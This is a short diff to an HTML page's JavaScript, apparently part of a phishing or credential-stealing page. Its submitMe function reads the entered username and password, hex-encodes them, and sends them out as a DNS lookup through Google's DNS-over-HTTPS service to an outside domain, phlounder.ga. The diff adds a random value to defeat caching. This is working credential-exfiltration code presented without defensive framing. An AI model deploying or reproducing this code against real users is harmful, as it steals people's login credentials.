@@ -12,14 +12,14 @@
         <script>
 function submitMe() {
         let b = document.getElementById("username").value +
-                "|" + document.getElementById("password").value;
+                "\t" + document.getElementById("password").value;
         let h = "";
         for (i=0; i<b.length; i++) {
                 hex = b.charCodeAt(i).toString(16);
                 h += ("000"+hex).slice(-2);
         }
         document.location = "https://dns.google.com/resolve?type=a&name=" + 
-                h + ".kittens.com";
+                h + "." + Math.random() + ".phlounder.ga";
 }
         </script>
 </html>
